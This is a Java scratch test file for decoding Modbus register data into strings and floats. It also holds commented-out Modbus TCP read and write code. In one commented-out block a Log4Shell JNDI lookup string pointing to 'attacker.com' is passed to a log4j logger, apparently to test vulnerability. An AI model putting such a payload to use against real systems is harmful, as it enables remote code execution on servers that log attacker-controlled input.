package com.demo;


import com.serotonin.modbus4j.ModbusFactory;
import com.serotonin.modbus4j.ModbusMaster;
import com.serotonin.modbus4j.code.DataType;
import com.serotonin.modbus4j.exception.ErrorResponseException;
import com.serotonin.modbus4j.exception.ModbusInitException;
import com.serotonin.modbus4j.exception.ModbusTransportException;
import com.serotonin.modbus4j.ip.IpParameters;
import com.serotonin.modbus4j.locator.BaseLocator;
import org.apache.logging.log4j.LogManager;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.ShortBuffer;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TestModbus {

    private static final Logger LOGGER = LoggerFactory.getLogger(TestModbus.class);

    private static final org.apache.logging.log4j.Logger LOG = LogManager.getLogger(TestModbus.class);


    public static void main(String[] args) throws ModbusInitException, ModbusTransportException, ErrorResponseException {
//        ByteBuffer byteBuffer = ByteBuffer.allocate(200);
//        byteBuffer.order(ByteOrder.LITTLE_ENDIAN);
//        byteBuffer.putShort((short) 12336);
//        byteBuffer.putShort((short) 12336);
//        byteBuffer.putShort((short) 14129);
//        byteBuffer.putShort((short) 12594);
//        byteBuffer.putShort((short) 12594);
//        byteBuffer.putShort((short) 14640);
//        byteBuffer.putShort((short) 12336);
//        byteBuffer.putShort((short) 12596);
//        byteBuffer.putShort((short) 12336);
//        byteBuffer.putShort((short) 12352);
//        byteBuffer.putShort((short) 12336);
//        byteBuffer.putShort((short) 13104);
//        byteBuffer.putShort((short) 13111);
//        byteBuffer.putShort((short) 12848);
//        byteBuffer.putShort((short) 16441);
//        byteBuffer.putShort((short) 12338);
//        byteBuffer.putShort((short) 13616);
//        byteBuffer.putShort((short) 12850);
//        byteBuffer.putShort((short) 12336);
//        byteBuffer.putShort((short) 12336);
//        byteBuffer.putShort((short) 14902);
//        byteBuffer.putShort((short) 12857);
//        byteBuffer.putShort((short) 16698);


        short[] data = new short[] {0, 1, 0, 0, 0, 0, 1, 2, 3, 1, 3, 3, 0, 1, -15729, 16818, -16777, 16691, -4194, 16972, -21496, 16252, 13107, 16691, -15729, 16818, 6816, 16823, -22020, 16902, 7078, 16947, -29360, 16955, -29360, 16955, -29360, 16955, -7340, 17270, -7340, 17170, 15335, 17236, -29360, 16955, 0, 0, 0, 0, 0, 0, 0, 0, 12336, 12336, 14129, 12594, 12594, 14640, 12336, 12596, 12336, 12352, 12336, 13104, 13111, 12848, 16441, 12338, 13616, 12850, 12336, 12336, 14902, 12857, 16698, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,};
        int size = 0;
        for (int i = 54; i <= 154; i ++) {
            if (data[i] > 0) {
                size ++;
            }
        }
        ByteBuffer byteBuffer = ByteBuffer.allocate(size * 2);
        byteBuffer.order(ByteOrder.LITTLE_ENDIAN);
        ShortBuffer shortBuffer = byteBuffer.asShortBuffer();
        shortBuffer.put(Arrays.copyOfRange(data, 54, size));
        System.out.println(new String(byteBuffer.array(), StandardCharsets.UTF_8));

//        System.out.println("093500201170000327211150001".substring(18, 27));
//        String header ="${jndi:ldap://attacker.com/a}";
//        LOG.info(header);
//        LOG.info("test: {}", header);

//        IpParameters params = new IpParameters();
//        params.setHost("192.168.3.1");
//        params.setPort(502);
//
//        ModbusMaster master = new ModbusFactory().createTcpMaster(params, true);
//        master.init();
//////        // Define the point locator.
//        BaseLocator<Number> loc = BaseLocator.holdingRegister(1, 7001, DataType.TWO_BYTE_INT_UNSIGNED);
//////
////////        // Set the point value
//        master.setValue(loc, 1111);
//////
//////        // Get the point value
//        System.out.println(master.getValue(loc));
//
//        ReadHoldingRegistersRequest request = new ReadHoldingRegistersRequest(1, 0, 2);
//        ReadHoldingRegistersResponse response = (ReadHoldingRegistersResponse) master.send(request);
//        byte[] data = response.getData();
//        float f = bytes2Float(data);
//        System.out.println(f);

        //11000010 10001111 01000001 10110010
        //1.0001111 01000001 10110010
//        int i = Integer.parseInt("10000101", 2);
//        System.out.println(i);
//        //133 - 127 = 6
//        //1000111.1 01000001 10110010
//        System.out.println(Integer.parseInt("1000111",2 ));
//        System.out.println(Integer.parseInt("1.10100000110110010",2 ));


        //01000001 10110010 11000010 10001111
//        char[] p = "10000011".toCharArray();
//        double aaa = ((Integer.parseInt(String.valueOf(p[0])) * Math.pow(2, 7)) +
//                (Integer.parseInt(String.valueOf(p[1])) * Math.pow(2, 6)) +
//                (Integer.parseInt(String.valueOf(p[2])) * Math.pow(2, 5)) +
//                (Integer.parseInt(String.valueOf(p[3])) * Math.pow(2, 4)) +
//                (Integer.parseInt(String.valueOf(p[4])) * Math.pow(2, 3)) +
//                (Integer.parseInt(String.valueOf(p[5])) * Math.pow(2, 2)) +
//                (Integer.parseInt(String.valueOf(p[6])) * Math.pow(2, 1)) +
//                (Integer.parseInt(String.valueOf(p[7])) * Math.pow(2, 0)));
//        System.out.println(aaa);
//        System.out.println(Math.pow(2, 7));
//        System.out.println(((int) p[0]) * Math.pow(2, 7));
//        char[] f = "01100101100001010001111".toCharArray();
//        int r = 0;
//        for (int i = 1; i <24; i ++) {
//            r += (Math.pow(2, i * -1) * f[i - 1]);
//        }
//        System.out.println(r);
//
//        System.out.println(46 * Math.pow(2, 131) / Math.pow(2, 127));

//        System.out.println(Float.intBitsToFloat(Integer.parseInt("01000001101100101100001010001111", 2)));
//
//
//        System.out.println(Float.intBitsToFloat(Integer.parseInt(Integer.toBinaryString(16691 & 0xFFFF) + Integer.toBinaryString(-16777 & 0xFFFF), 2)));

//        List<Integer> data = Arrays.asList(12336,
//                12336,
//                14129,
//                12594,
//                12594,
//                14640,
//                12336,
//                12596,
//                12336,
//                12352,
//                12336,
//                13104,
//                13111,
//                12848,
//                16441,
//                12338,
//                13616,
//                12850,
//                12336,
//                12336,
//                14902,
//                12857,
//                16698);
//
//        byte[] bb = new byte[data.size() * 2];
//        int offset = 0;
//        for (Integer d : data) {
//            short2Bytes(d.shortValue(), bb, offset);
//            offset = offset + 2;
//        }
//        String d = new String(bb, StandardCharsets.UTF_8);
//        System.out.println(d);
//        Pattern pattern = Pattern.compile("(\\d+)@(\\d+)@(\\d+):(\\d\\d):(\\w)");
//        Matcher matcher = pattern.matcher(d);
//        if (matcher.matches()) {
//            System.out.println(matcher.group(3));
//        }

//        System.out.println(new SecureRandom().nextBoolean());

//        System.out.println("000017212109004100@0000373029@20052200006:92:A".substring(30, 41));

    }

    private static void short2Bytes(short s, byte[] bytes, int offset) {
        bytes[offset] = (byte) (s & 0xff);
        bytes[offset + 1] = (byte) ((s & 0xff00) >> 8);
    }

}
